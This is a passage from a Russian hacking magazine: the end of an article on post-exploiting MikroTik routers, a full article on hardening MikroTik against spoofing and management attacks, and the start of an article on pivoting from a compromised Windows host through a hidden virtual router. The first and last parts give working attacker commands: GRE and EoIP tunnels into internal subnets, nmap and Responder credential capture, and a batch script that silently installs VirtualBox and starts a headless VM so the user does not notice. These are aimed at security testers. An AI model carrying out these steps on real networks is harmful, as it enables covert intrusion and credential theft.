А это при мер инкапсулированной полез ной наг рузки. Здесь атакующий про-
водит ICMP-сканирование внут ренней сети 10.10.160.0/24 поверх GRE-тун-
неля. Тут можно уви деть GRE-инкапсуляцию с внут ренним IPv4-заголовком
ICMP. Однако по факту здесь присутствуют два заголов ка IPv4. Почему?
Потому что первый IPv4-заголо вок с белыми IP-адре сами — это пакет-курь-
ер. Он позволя ет дос тичь адресата, находя щегося во внут ренней сети. То
есть главная задача этого заголовка в том, чтобы полез ная нагрузка из внут-
ренней сети дош ла до адресата через интернет. В тер минологии GRE такой
заголо вок называется Delivery Header. Для каждого протоко ла-пас сажира
при сутствует специальный Protocol Type, для IPv4 это значение равно 0x0800.





                ICMP-сканиро вание внутри GRE-туннеля

Настройка на стороне ата кующего будет выглядеть следующим обра зом.
Создание GRE-интерфейса, настрой ка адресов начала и терминирования
туннеля и сама акти вация интерфейса с внутренней IP-адресацией.


caster@kali:~$ sudo ip link add name evilgre type gre local 212.100.
144.150 remote 100.132.55.140
caster@kali:~$ sudo ip addr add 10.10.10.1/24 dev evilgre
caster@kali:~$ sudo ip link set evilgre up

Настройка RouterOS тоже не вызывает проблем — тот же принцип, отличия
лишь в синтаксисе:


[pwned@BORDER] > /interface/gre add name=gre1 local-address=100.132.
55.140 remote-address=212.100.144.150
[pwned@BORDER] > /ip/address add address=10.10.10.2/24 interface= gre1

Пос ле уста нов ки тун неля атакующий дол жен создать спе циальные маршру ты
сквозь RouterOS, а именно через 10.10.10.2. В кон тексте нашего лабора тор-
ного стенда за пограничным RouterOS находятся три подсети:
 • 10.10.120.0/24;
 • 10.10.140.0/24;
 • 10.10.160.0/24.


caster@kali:~$ sudo route add -net 10.10.120.0 netmask 255.255.255.0
gw 10.10.10.2
caster@kali:~$ sudo route add -net 10.10.140.0 netmask 255.255.255.0
gw 10.10.10.2
caster@kali:~$ sudo route add -net 10.10.160.0 netmask 255.255.255.0
gw 10.10.10.2

Те перь атакующий может вза имо действовать с внут ренней инфраструктурой
и расширять свое при сутствие в сети цели. Вот пример Nmap-сканирования
про тив сети 10.10.140.0/24:


caster@kali:~$ sudo nmap -n 10.10.140.0/24 -vvv





           Ре зультат ска ниро вания атакующего поверх GRE

На самом деле это не последний вектор тун нелирования. Есть еще EoIP, он
позволя ет трансли ровать Ethernet-фреймы внут ри GRE, а это вектор для L2-
туннелирования.


L2 EoIP VPN
Это спе цифи ческий век тор, при котором ата кующий стро ит L2-туннель сквозь
ском про метированную RouterOS между сво им хостом и находя щейся по ту
сторону сетью.
   EoIP (Ethernet over IP) — это проприетар ный протокол MikroTik, позволя-
ющий стро ить L2-туннели поверх интерне та, но для этого используется GRE-
инкапсуляция. По фак ту EoIP — это абсо лютно то же самое, что и GRETAP-
интерфейсы на Linux, раз личия лишь в Proto Type (для EoIP в GRE это зна-
чение 0x6400, для GRETAP-туннелей — 0x6558).
  При постэксплуатации RouterOS ата кующий может построить L2-туннель
между собой и целевым бриджем с помощью EoIP, однако для работы EoIP
в дистрибутивах Linux нужен модуль eoip. Ата кующему достаточно создать
EoIP-интерфейс в RouterOS, затем помес тить его внутрь бриджа (в 90% слу-
чаях в конфигурациях RouterOS используют ся бриджи).
  На сво ей стороне ата кующему достаточно соб рать модуль из репозитория
и запустить интерфейс, при этом создав TAP-интерфейс для корректной
работы мо дуля от katlogic.
   Схе ма туннелиро вания будет выг лядеть следующим образом.





                     Карта EoIP-туннелирования

Ата кующий из интерне та может оказать ся в целевой сети на уровне L2, но это
крайне специфи ческий сце нарий и име ет право на существование только
в момент пос тэксплу ата ции.
  Настрой ки на стороне ата кующего выглядят следующим образом: соз-
дается TAP-интерфейс, запус кается модуль, туннелю зада ется ID 11.


caster@kali:~$ sudo ip tuntap add mode tap tap0
caster@kali:~$ sudo ip link set tap0 up


caster@kali:~/eoip$ sudo ./eoip tap0 100.132.55.100 212.100.144.100:
11

На сто роне RouterOS идентичная ситуация, но при этом нуж но помес тить соз-
данный EoIP-интерфейс в существующий бридж внутри RouterOS для получе-
ния L2-дос тупа.


[caster@MikroTikNightmare] /interface/eoip> add name=nightmare local-
address=212.100.144.100 remote-address=100.132.55.100 tunnel-id= 11
[caster@MikroTikNightmare] /interface/bridge/port> add interface=
nightmare bridge=LAN-BR

Туннель EoIP уже установлен, задача атакующего — получить адрес на TAP-
интерфейсе, после чего он может вза имо действовать с целевой сетью и про-
водить атаки канального уровня. При чем по DHCP может передаться адрес
шлюза по умол чанию из другой сети, а это наруша ет сетевую связность, так
что этот маршрут нужно будет уда лить:


caster@kali:~$ sudo dhclient -v tap0; sudo route del default

Те перь атакующий может про водить L2-ата ки. Вот при мер работы Responder
внутри EoIP-туннеля:


caster@kali:~$ sudo responder -I tap0 -vvv





          Перехваченный NetNTLMv2-SSP пользовате ля user


ÂÛÂÎÄÛ

На этом мы заканчиваем рассмот рение атак на сети на основе оборудования
MikroTik. Тех ники необычные, но могут ока заться кстати в опре делен ных ситу-
ациях. В сле дующем материале поговорим о defensive — то есть нас тройках,
которые предот вра тят подоб ные ата ки.
COVERSTORY





     ЗАЩИЩАЕМ ОБОРУДОВАНИЕ
      MIKROTIK ОТ ХАКЕРСКИХ АТАК




Ус тройства MikroTik можно часто встре тить
в корпоративных  сетях, одна ко кон фиги
в боль шинс тве случаев оставляют желать
лучшего   и   открывают   возможность
для целого ряда атак. В этой статье я рас-               Caster                                                                                        Network Security Expert
смот рю  основные  концепции  сетевой             @wearecaster
безопасности RouterOS с уклоном в защиту
от спуфинга, обработку трафика и атаки
на панели управле ния.




                      Это ни в коем слу чае не полноценный мануал
                      по безопасности сетей с MikroTik, и наобо рот —
                      не все из приведенных примеров применишь
                       на дру гом оборудовании.


Надежно защитить сеть получит ся, только если понимать всю ее картину
и уметь интегри ровать функции безопасности так, чтобы они работа ли кор-
ректно и не нарушали нормальную работу. В этом и есть сложность сетевой
безопасности. Сети — основа любых современ ных организаций, и к работе
с ними нужно под ходить осторожно.


ÍÅÈÑÏÎËÜÇÓÅÌÛÅ ÈÍÒÅÐÔÅÉÑÛ

Одно из глав ных правил хороше го тона — выключать неиспользуемые
интерфейсы. Это снижает веро ятность несанкциони рованного под ключения.
Соблюсти это пра вило очень просто:




  [caster@MikroTikDaymare] /interface/ethernet> set etherX disabled=yes





                     Все   при меры   я   буду   демонс трировать
                       на RouterOS версии  7, последней на момент
                       написа ния статьи.



DISCOVERY-ÏÐÎÒÎÊÎËÛ

Discovery-про токолы (DP) уязвимы к двум oﬀensive-векторам:
 • Information Gathering — атакующий может извлечь чувствительную
  информацию против обо рудования, рассылающе го DP в свои порты;
 • Neighbor Table Overflow — атакующий может выполнить переполнение
   таб лицы соседей в контексте протоколов CDP/LLDP, что перегружает про-
   цессор устрой ства, а это при водит к DoS. Ата ка основана на создании
  лож ных DP-кадров и мас совой рассылке с при целом на порт RouterOS.

Лучшая практика — огра ничить работу этих про токо лов, то есть оставить их
только на  тех интерфейсах, где это необходимо. Тогда оборудование
не будет лиш ний раз распространять информа цию о себе там, где это не
нуж но.




  [caster@MikroTikDaymare] > /ip/neighbor/discovery-settings/set discover-
  interface-list=<your interface list> protocol=cdp,lldp,mndp



ÁÅÇÎÏÀÑÍÎÑÒÜ WINBOX ÍÀ L2

Winbox может работать на уровне L2, то есть сетевой инже нер может обра-
титься к RouterOS, минуя сетевой уро вень. За это отвечает именно MAC
Winbox Server, позволя ющий подклю читься к Winbox без IP-адресации.
  По умол чанию MAC Winbox Server дос тупен на всех интерфейсах, и это
нехорошо. Для повыше ния безопасности рекомен дуется раз решить исполь-
зовать его толь ко на определенных интерфейсах.
  Пример: я разрешаю MAC Winbox Server только на внутреннем LAN-лис те,
где находится LAN-мост для работы внут ри сети.




  [caster@MikroTikDaymare] /tool/mac-server> set allowed-interface-list=
  <interface_list>


Разрешай MAC Winbox Server там, где тебе нуж но.


DHCP SNOOPING

DHCP Snooping — это функция безопас ности, которая предот вращает атаку
DHCP Spoong. Атака работает сле дующим образом: злоумышленник внутри
сети  поднимает  ложный DHCP-сер вер  для  последу ющей  MITM-атаки.
По DHCP может передаваться адрес шлюза по умолчанию, и этим адресом
может быть хост атакующего.
  DHCP Snooping работа ет по прин ципу доверен ных и недоверенных пор-
тов. На недове ренных портах будут отслеживать ся все DHCP-сообщения.
Цель в том, чтобы проверить, сгенери рованы ли они DHCP-сервером. Ведь
если в пользовательском сег менте мы будем видеть сообщения вроде
DHCPLEASEQUERY, DHCPOFFER и DHCPACK, то это однозначно аномалия и в
поль зовательской сети находит ся DHCP-сервер. На доверенных же портах
все DHCP-сообщения будут счи таться легитимными. Обычно доверенные
пор ты настраивают ся на соединениях между ком мутаторами и мар шрутиза-
торами, а недове ренные конфигури руются на портах, куда подклю чают ся
конечные станции (например, компь ютер, принтер, точки доступа, VoIP).




                     Под робнее о защите от спу финга ты найдешь
                        в моей статье «Save Me. Защища ем сети от спу-
                        финг-атак».


В RouterOS DHCP Snooping вклю чается имен но на bridge, где все порты
устройства уже будут счи таться недоверенными. Но чтобы переключить нуж-
ный порт, тебе понадо бится переходить в настройки самого интерфейса.
DHCP Snooping требует вдумчивой настройки, в ходе которой нуж но будет
отталкиваться от осо бенностей инфраструк туры.




                   В DHCP Snooping может исполь зоваться Option
                         82. Это воз можность протоко ла DHCP, которая
                      при меня ется  для  опо вещения  сервера DHCP
                      о том, с какого порта поступил DHCP-запрос. Так-
                    же передается информация об использовании
                   DHCP Relay. Некоторые специфи ческие сценарии
                        требуют Option 82, так что при необходимос ти
                      включай  ее. На сайте  MikroTik есть стра ница
                      о  нас тройке  Snooping,  где  учтен  сценарий
                        с использованием «Опции 82».


Вклю чаем DHCP Snooping на bridge:




  [caster@MikroTikDaymare] > /interface/bridge/set dhcp-snooping=yes <your
  bridge name>


Назначаем доверенный порт в контек сте DHCP Snooping:




  [caster@MikroTikDaymare] /interface/bridge/port> set trusted=yes
  interface=<interface> bridge=<your bridge name> numbers=<interface
  number on bridge>


На этом конфигурация DHCP Snooping завер шена, на недоверенных портах
будут отсекаться слу жебные DHCP-сообщения, которые обычно используют-
ся именно DHCP-сер вером. Поскольку при ата ке злоумышленник должен
навязать свой адрес в качес тве шлюза сооб щени ем DHCPOFFER, эти настрой-
ки помогают полностью предотвра тить ее. Одна ко будь осторожен с настрой-
ками, чтобы не вызвать непреднамерен ный DoS.


ÍÀÑÒÐÎÉÊÀ ÔÀÉÐÂÎËÀ

Firewall в RouterOS — это подсисте ма, которая отвечает за обработку и филь-
трацию всех пакетов. К настрой ке фай рво ла, на мой взгляд, дол жно быть осо-
бое отношение, потому что от нее зависит и про изводительность устрой ства,
и уровень безопас ности.
  Мы не будем здесь подробно рассмат ривать все возможности файрвола
в RouterOS. Их много, и они могут быть крайне полез ными и мощными. Но им
пос вящено мно жество ста тей и спра воч ных тек стов. На «Хакере», к при меру,
можешь почитать статьи «Стена огня. Учимся нас тра ивать фай рвол на при-
мере MikroTik» и «Стена огня lvl2. Нас тра иваем фай рвол для отражения атак
на примере MikroTik».
  Мы же оста новимся только на важных моментах, свя занных с защитой
от прод винутых атак.


Êîððåêòíàÿ îáðàáîòêà òðàôèêà
В RouterOS маршрутизи руется весь тра фик: исполь зует ся концепция «раз-
решено всё, что не запрещено». Трафик обра баты вается сверху вниз по пра-
вилам. Лучшей прак тикой считается уста нав ливать в начале настро ек фай-
рво ла правила в цепочках INPUT/Forward, которые раз решают соединения
Established/Related и отбрасывают соединения Invalid. Кстати говоря, именно
благодаря механизму Connection Tracking достигается отслеживание соеди-
нений по их сос тоянию.


[caster@MikroTikDaymare] /ip/firewall/filter> add chain=input action=
accept connection-state=established,related log=no log-prefix=""
[caster@MikroTikDaymare] /ip/firewall/filter> add chain=input action=
drop connection-state=invalid log=no log-prefix=""
[caster@MikroTikDaymare] /ip/firewall/filter> add chain=forward
action=accept connection-state=established,related log=no log-prefix=
""
[caster@MikroTikDaymare] /ip/firewall/filter> add chain=forward
action=drop connection-state=invalid log=no log-prefix=""


Àêêóðàòíàÿ ðàáîòà ñ ICMP
Также сто ит разрешить работу про токо ла ICMP и при этом с небольшим огра-
ниче нием на число пакетов в секунду, что бы избежать потенциального DDoS
по протоко лу ICMP. Часто весь трафик ICMP блокиру ют на внешнем перимет-
ре, однако это может повлиять на работу PMTUD, который помога ет бороться
с избы точной фрагмента цией при нестандартных значениях MTU.




  [caster@MikroTikDaymare] /ip/firewall/filter> add chain=input
  action=accept protocol=icmp in-interface-list=<WAN_Interface>
  limit=50/5s,2:packet log=no log-prefix=""



TTL Shift
Ес ли твое оборудо вание выс тупает прокси-сервером и есть необходимость
скрыть его IP-адрес из трас сировки, то нуж но в таблице Mangle в цепочке
PREROUTING сме щать TTL с инкрементом +1:




  [caster@MikroTikDaymare] /ip/firewall/mangle> add chain=prerouting
  action=change-ttl new-ttl=increment:1 passthrough=yes in-interface=
  <internal_interface_for_ttl_shift> log=no log-prefix=""



Ðèñê DNS-ôëóäà
Следи за тем, чтобы наружу не торчал порт протоко ла DNS, на который может
при лететь потенциальный DDoS. Нередко слу чает ся так, что именно по DNS
при ходит DDoS-атака на MikroTik. Очень часто быва ет, что в настройках DNS
на MikroTik сто ит галочка Allow Remote Requests, которая позволяет RouterOS
быть DNS-сервером. Обычно это встречается для внут ренней инфраструк-
туры, но порт может торчать и на внеш нем интерфейсе, смот рящем в сторону
интернета.


Drop All Other
В конце списка правил файрво ла всегда должен сто ять запрет Drop All Other
для внешнего интерфей са RouterOS (того, который смот рит именно в сторону
интернета; RouterOS не различает внут ренние и внешние интерфей сы). Оно
будет запрещать все нераз решен ные подклю чения к маршрутизатору, одна ко
позаботь ся о том, что бы свер ху были все необходимые правила для тво их
про токо лов, тогда финаль ное пра вило не будет нарушать сетевую связ ность.
Правило Drop All Other должно идти в кон це спис ка правил абсолют но любого
файрвола.




  [caster@MikroTikDaymare] /ip/firewall/filter> add chain=input
  action=drop in-interface=<WAN_Interface> log=no log-prefix=""



ÄÈÍÀÌÈ×ÅÑÊÀß ÌÀÐØÐÓÒÈÇÀÖÈß

Безопасность про токолов динами ческой маршрутиза ции (Dynamic Routing
Protocols, DRP) имеет особое значение, поскольку малей шее воздей ствие
на AS частично парали зует внутреннюю сеть. К тому же на домен динамичес-
кой маршрутизации возможны раз личные атаки,  к которым нужно быть
готовым. Дальше речь пойдет о безопасности именно протоко ла OSPF (Open
Shortest Path First), который поддерживается RouterOS.


Ïàññèâíûå èíòåðôåéñû
Настройка пассивных интерфейсов для динами ческой маршрутиза ции поз-
воля ет роутеру запретить рас сылать объявления через некоторые интерфей-
сы. По умолчанию без нас тройки пас сивных интерфей сов он рассылает объ-
явле ния во все интерфей сы, а это подвергает домен маршрутиза ции боль-
шому риску.
  Ниже параметр passive указывает на пас сивный интерфейс.




  [caster@MikroTikDaymare] /routing/ospf/interface-template> add
  interfaces=<interface> passive area=backbone



Êðèïòîãðàôè÷åñêàÿ àóòåíòèôèêàöèÿ
При мене ние аутентифика ции в доменах маршрутиза ции позволя ет сделать
так, что бы под клю чаться к ним мог ли только авторизованные маршру тиза-
торы. Однако аутентифика ция нас тра ивается с помощью паролей. Так что
обя зательно нуж но позаботиться о том, чтобы эти пароли были достаточно
стой кими. Если зло умышленник получит значение хеша из дам па трафика, то
он может попытать ся вскрыть пароль перебором. А с паролем он уже без тру-
да под клю чится к домену маршру тизации.
  Настрой ка ниже использует SHA-384. Кстати говоря, Ettercap сможет
выдер нуть любой MD5/SHA-хеш, что даст атакующему воз можность поп-
робовать сбрутить пароль от домена OSPF. Опять же следи за стойкостью
пароль ной фра зы.




  [caster@MikroTikDaymare] /routing/ospf/interface-template> set
  auth=sha384 auth-key=<auth_key> auth-id=<auth_id> numbers=X



ÁÅÇÎÏÀÑÍÎÑÒÜ ÑÈÑÒÅÌÛ ÐÅÇÅÐÂÈÐÎÂÀÍÈß VRRP

Безопасность системы горячего резервирования VRRP может быть под угро-
зой, так как ата кующий может провести FHRP Master-спу финг и MITM-атаку.
Ввиду осо бенностей работы VRRP здесь невозможно установить приори-
тет 255, поэтому придется действо вать более жес тко. Есть два действенных
спо соба.
  Способ пер вый — криптографическая аутентификация. Она защищает
домен VRRP с помощью спе циальной пароль ной фразы, не зная которую ата-
кующий не проведет спуфинг. Опять же нужно позаботиться, чтобы ключ
аутентификации был устойчив к брут форсу. В RouterOS для защиты VRRP
используется про токол из репер туара IPSec — AH. Уточнив у разработчиков
RouterOS, я узнал, что его реализация в RouterOS основана на HMAC-MD5.




  [caster@MikroTikDaymare] /interface/vrrp> add interface=<interface>
  priority=<priority_value> version=2 vrid=<group_id_number>
  authentication=ah password



Второй способ — фильтрация средс твами файрво ла. Для VRRPv3 аутен-
тификация боль ше не под держивается, однако с этим нужно тоже что-то
делать. С помощью таблиц Mangle и Raw можно заранее раз решить VRRP
с легитимных VRRP-маршрутизаторов, а затем блокировать остальные VRRP-
пакеты. Этот вари ант даст наименьшую наг рузку на процессор. Получит ся,
что в разрешаемых правилах нет адреса ата кующего хоста, поэтому любые
его попытки провести ата ку на домен VRRP будут тщетны.




  [caster@MikroTikDaymare] /ip/firewall/mangle> add chain=prerouting
  action=accept protocol=vrrp src-address=<first_vrrp_speaker_ip> in-
  interface=<interface> log=no log-prefix=""


  [caster@MikroTikDaymare] /ip/firewall/mangle> add chain=prerouting
  action=accept protocol=vrrp src-address=<second_vrrp_speaker_ip> in-
  interface=<interface> log=no log-prefix=""


  [caster@MikroTikDaymare] /ip/firewall/raw> add chain=prerouting
  action=drop in-interface=<interface> log=no log-prefix="" protocol=vrrp



Ïðîáëåìà ïñåâäîáàëàíñèðîâêè
VRRP, конеч но, обеспечива ет отказоустойчивость, однако по фак ту в логичес-
кой группе работает толь ко один мар шру тизатор, когда осталь ные пре быва-
ют в режиме ожи дания.
   Если в твоей сети несколько устройств с RouterOS и нес колько сегментов
VLAN, ты можешь задей ствовать все RouterOS в твоей сети, например:
 • RouterOS1 будет MASTER за VLAN 120 и VLAN 140, а за VLAN 180 и VLAN
   220 он будет BACKUP;
 • RouterOS2 будет MASTER за VLAN 180 и VLAN 220, за VLAN 120 и VLAN
   140 он будет BACKUP. То есть конфигурация зеркальна RouterOS1.

Этот при ем называется псевдобалан сировкой. Конечно, тут нет того же round
robin, но хотя бы все роутеры в домене VRRP будут работать. Для MASTER —
при оритет 200, для BACKUP — 90. Циф ры и VLAN ID я взял из головы
для симуля ции такого сценария.
  Настраиваем RouterOS1:





  [caster@RouterOS1] /interface/vrrp> add interface=vlan120 name=vrrp120
  priority=254 vrid=120



  [caster@RouterOS1] /interface/vrrp> add interface=vlan140 name=vrrp140
  priority=254 vrid=140



  [caster@RouterOS1] /interface/vrrp> add interface=vlan180 name=vrrp180
  preemption-mode=no priority=90 vrid=180



  [caster@RouterOS1] /interface/vrrp> add interface=vlan220 name=vrrp220
  preemption-mode=no priority=90 vrid=220



И RouterOS2:





  [caster@RouterOS2] /interface/vrrp> add interface=vlan120 name=vrrp120
  preemption-mode=no priority=90 vrid=120



  [caster@RouterOS2] /interface/vrrp> add interface=vlan140 name=vrrp140
  preemption-mode=no priority=90 vrid=140



  [caster@RouterOS2] /interface/vrrp> add interface=vlan180 name=vrrp180
  priority=254 vrid=180



  [caster@RouterOS2] /interface/vrrp> add interface=vlan220 name=vrrp220
  priority=254 vrid=220



Таким образом возникает псевдобалан сировка. Два RouterOS настроены
зеркально, они оба готовы к замене вышед шего из строя MASTER-роутера.
При этом задей ствуются все мощности внутри сегмента, второстепенное
обо рудование не будет простаивать.  Также  учитывай,  что  в RouterOS
PREEMPT-режим вклю чен по умолчанию, он позволя ет упавшему ранее
MASTER-роутеру вер нуть себе эту роль, когда его заменил один из BACKUP-
роутеров. Для бэкап-роутеров, соот ветственно, PREEMPT выключается


ÁÅÇÎÏÀÑÍÎÑÒÜ ÄÅÐÅÂÀ STP

STP (Spanning Tree Protocol) — это L2-протокол, защищающий компьютерную
сеть  от  широковещательных  штормов  путем  блокировки  избы точных
физических соеди нений. Дело в том, что у Ethernet-кадров нет поля TTL,
и широко вещательный трафик будет бесконечно бегать по канальным соеди-
нениям, если возникнет ком мутаци онная петля. Про токол работает исклю-
чительно на канальном уровне, и для обще ния используются фреймы BPDU
802.3. Обычно на управляемых ком мутаторах STP включен по умол чанию.
  Однако ата кующий может отправить в сторону коммутатора STP BPDU-
кадр с наимень шим зна чени ем приоритета, что даст ему шанс перех ватить
роль кор невого ком мутато ра. Такой ход событий при водит либо к час тичной
MITM-атаке, либо к DoS.
  Защититься от спу фин га в дереве STP мож но при помощи BPDU Guard.
Этот механизм будет блокировать порт, если на него придет BPDU-кадр,
который обычно исполь зуется только для согласования между коммутато-
рами в домене STP. Именно благодаря рас сылке BPDU с наименьшим зна-
чени ем приори тета ата кующий может перехватить роль корневого ком-
мутато ра, тем самым осуществив час тичную MITM-атаку.
  BPDU Guard настраивается имен но на пор тах, которые находятся под мос-
том.




  [caster@MikroTikDaymare] /interface/bridge/port> set bpdu-guard=yes
  interface=<interface> bridge=<bridge> numbers=X


Вот и вся настройка. BPDU Guard в этом пла не не дос тавля ет хлопот.


Îñòîðîæíîñòü ïðè âûáîðå STP Root
Кор невым коммутато ром STP обыч но ста новится ком мутатор с наименьшим
MAC-адре сом. Ты должен учи тывать этот аспект, потому что, если корневым
ком мутато ром станет какой-нибудь ста рый  D-Link, это может сказаться
на производительнос ти сети. Также быва ют случаи, когда по STP блокируются
линки, иду щие в сто рону маршрутизаторов FHRP Master, тогда трафик может
начать идти не по оптимальному пути. Нас тра ивай ком мутатор STP Root (и
STP Root Secondary) с учетом особенностей инфраструктуры.


ÁÅÇÎÏÀÑÍÎÑÒÜ ÏÀÍÅËÈ ÓÏÐÀÂËÅÍÈß (MGMT)

Çàùèòà RMI
MGMT — это спе циальные интерфейсы управления, которые позволяют нас-
траивать устрой ство. В RouterOS для это го исполь зуются следующие службы:
 • Telnet (TCP/23);
 • API (TCP/8728);
 • API-SSL (TCP/8729);
 • SSH (TCP/22);
 • HTTP (TCP/80);
 • HTTPS (TCP/443);
 • Winbox (TCP/8291).

Для панелей управления необходимо уста новить огра ничение: доступ только
из администра торской под сети. Это позволяет предотвратить попытки брут-
форса учетных данных из остальных подсетей, так как все подключения
из других сетей будут отброшены.




  [caster@MikroTikDaymare] /ip/service> set address=<MGMT Subnet
  Address/24> <protocol_name>


Однако даже в адми нистраторской под сети есть вероятность брутфорса,
если один из компь ютеров администра тора будет заражен трояном. На этот
слу чай можно дополнитель но уси лить защиты следующим образом:
 • до бавить цепочки правил для пре дотвра щения брутфорса в таблицы
   Mangle/Raw;
 • ис поль зовать толь ко протокол SSH и аутентификацию по ключу;
 • сме нить номера пор тов (это, конечно, не пол ная мера безопас ности,
   но может усложнить поиск порта управления оборудо вани ем);
 • если не используются API/API-SSL, то их лучше вык лючить, по ним тоже
   возможен брутфорс.


Çàùèòà ó÷åòíûõ çàïèñåé íà îáîðóäîâàíèè
На сво ем оборудо вании придер живай ся кон цепции наименьших привиле гий,
не разбрасывай ся full-учетками на железе и следи, у какого инженера какой
доступ к оборудо ванию и какие возможности для настройки. Также для опти-
миза ции управления учет ками мож но поднять AAA-сервер, где учетные
записи будут храниться централизован но и ими легко будет управлять.


ÂÛÂÎÄÛ

На этом моя статья подходит к концу. Это не полный ману ал по безопасности
MikroTik, однако я старался акцентировать вни мание на критических механиз-
мах безопас ности, к которым должно быть особое отношение в корпоратив-
ных сетях. Именно невер ные настрой ки безопас ности внутри сети создают
боль шее число проблем. Полагаю, так происходит из-за халатности сетевых
инже неров. Оно и понятно: сети, бывает, не меняются десятилетиями, и об
отсутс твии нужных настроек просто забывают.
  Системы RouterOS и Switch OS, которые используются в оборудовании
MikroTik, тоже еще далеки от идеала. В них отсутствуют такие механиз мы,
как DAI, RA Guard, SAVI, Port Security. Продукты MikroTik очень популярны,
однако у их разработ чиков есть еще огромное поле для деятельности.
  Думаю, в ближайшем будущем я выпущу вторую часть этой работы, где
раз беру еще боль ше аспектов безопас ности MikroTik.
COVERSTORY





          ИСПОЛЬЗУЕМ
       ВИРТУАЛЬНЫЙ MIKROTIK
      ДЛЯ ПОСТЭКСПЛУАТАЦИИ
            WINDOWS





Недав но я нашел новый спо соб орга низа-
ции   L2-туннелиро вания  против  сетей
Windows. Вдохновив шись иде ей пингви-
на-супершпиона, я про демонстрирую пос-
тэксплу атацию Windows с помощью вир-               Caster                                                                                        Network Security Expert
туаль ного MikroTik CHR, который поз волит             @wearecaster
про вести пивотинг и получить L2-доступ
к целевой сети.




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.


17 июня 2020 года в «Хакере» вышла статья Андрея Жукова  (@s0i37)
про интересный способ постэксплуата ции Windows: для дальнейше го прод-
вижения по сети и перехвата учетных данных внутри создается виртуаль ная
машина на Linux. Для дос тижения сво ей цели Андрей исполь зовал VirtualBox
в silent-режиме. Основная идея в том, что бы вир туальная машина на Linux
работа ла в режиме моста, причем в сам мост на  Linux помещается
интерфейс, который смот рит в сторону реальной ОС. Так у этой машины
появляет ся L2-дос туп, который открывает воз можнос ти для атак канального
уров ня, таких как ARP-спу финг или LLMNR/NBNS-спуфинг. Важный момент:
эта тех ника тре бует прав администра тора на скомпрометированной Windows-
машине.





CASTER REMIX

Я вдохновился идеей s0i37, когда пытал ся най ти новые способы L2-тун-
нелиро вания про тив Windows. Мне пришла в голову мысль запустить вир-
туальный  роутер  MikroTik CHR  внутри  реальной  Windows  с помощью
VirtualBox.
  CHR (Cloud Hosted Router) — это виртуальный маршрутиза тор MikroTik,
который можно установить с помощью технологий виртуализации. И у него
тоже есть воз можность деплоя на VirtualBox. Я выбрал именно его, так
как RouterOS 7 — очень гиб кий и многофун кци ональный инструмент. В нем
есть необходимый VXLAN, который работа ет ста бильно. На осно ве идеи
s0i37 я при думал сле дующую концепцию:
 • деп лой CHR внутри Windows при постэкс плуатации;
 • се тевая нас трой ка CHR в режиме bridge в VBOX;
 • соз дание пол ноценного L2-туннеля с VXLAN, бриджинг интерфей сов
   и получе ние доступа.





                       Схема исследования




                       Этот   вектор   работа ет   корректно   только
                       для реальных физичес ких машин, так как при экс-
                        плуатации виртуаль ных машин могут возникнуть
                      проблемы с про хождени ем трафика из-за того,
                         что на интерфейсе скомпро метированной вир-
                         туалки может не быть нераз борчи вого режима.


Я пос троил дос таточно небольшую сеть для демонс трации ремикса, но мой
метод может  работать  из любой  точки  сетевой  инфраструктуры,  так
как Ethernet-фреймы в туннеле будут передавать ся поверх L3-соединений
с помощью VXLAN-туннелирования.


CHR DEPLOY

MikroTik CHR мы используем в качес тве L2-шлю за, но он будет работать
на осно ве VirtualBox. Вот только VirtualBox нуж но каким-то образом уста-
новить на целевой хост, а при этом не всегда есть возможность обеспечить
себя гра фичес кой оболочкой. Я предусмотрел этот сценарий и нашел способ
«тихой» уста нов ки  VirtualBox, а  также способ орга низации виртуальной
машины.
  Сама VirtualBox в silent-режиме уста нав лива ется таким образом (я исполь-
зую версию 7.0.8):


C:\remix>VirtualBox-7.0.8-156879-Win.exe -s

Те перь соз даем виртуальную машину CHR. Если нет GUI, это можно сделать
с помощью VBoxManage.exe. Сама вер сия CHR — 7.10.2.
  Я приготовил спе циальный bat-файл для автомати зации процесса. Прошу
заметить, что я исполь зую образ диска VDI, который буду под ключать к соз-
данной вир туальной машине. Образы VDI обычно ска чиваются с официаль-
ного сайта MikroTik.
  Я все нас траиваю так, чтобы машина работала в режиме моста с нераз-
борчивым режимом. При нас тройке сети тебе понадо бится установить точ-
ное имя интерфей са в ОС, но его лег ко узнать с помощью команды Get-
NetAdapter в оболоч ке PowerShell.


C:\remix>remix.bat


remix.bat
@echo off


set VMNAME=CasterRemix
set VMMEMORY= 512
set VMCPUS= 2
set VMDISK= C:\r emix\chr-7.10.2.vdi
set VMNIC1=bridged
set VMADAPTER1="Intel(R) Wi-Fi 6 AX201 160MHz"
set VMPROMISC1=allow-all


"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" createvm --name
"%VMNAME%" --register
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" modifyvm
"%VMNAME%" --memory %VMMEMORY% --cpus %VMCPUS%
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" storagectl
"%VMNAME%" --name "SATA Controller" --add sata --controller IntelAHCI
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" storageattach
"%VMNAME%" --storagectl "SATA Controller" --port 0 --device 0 --type
hdd --medium "%VMDISK%"
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" modifyvm
"%VMNAME%" --nic1 %VMNIC1%
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" modifyvm
"%VMNAME%" --bridgeadapter1 %VMADAPTER1%
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" modifyvm
"%VMNAME%" --nicpromisc1 %VMPROMISC1%
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" startvm
"%VMNAME%" --type headless

Параметр --headless указывает на то, что вир туальная машина запустится
в тихом режиме, чтобы не привлечь лиш нее вни мание пользовате ля.
  После запуска CHR маршру тиза тор получит адрес автоматически, так
как это заложе но в его конфигурации по умолчанию. Но нам необходимо най-
ти сам адрес маршру тизатора. Это мож но сде лать, например, с помощью
классического сканирования портов TCP/22, TCP/8291 в сети 192.168.1.0/24,
где запущен сам CHR в бридже. В моем случае адрес — 192.168.1.36.
   Те перь под клю чим ся  к панели управления CHR (например, по SSH
или Winbox) и сде лаем началь ную настройку. Нам понадобиться
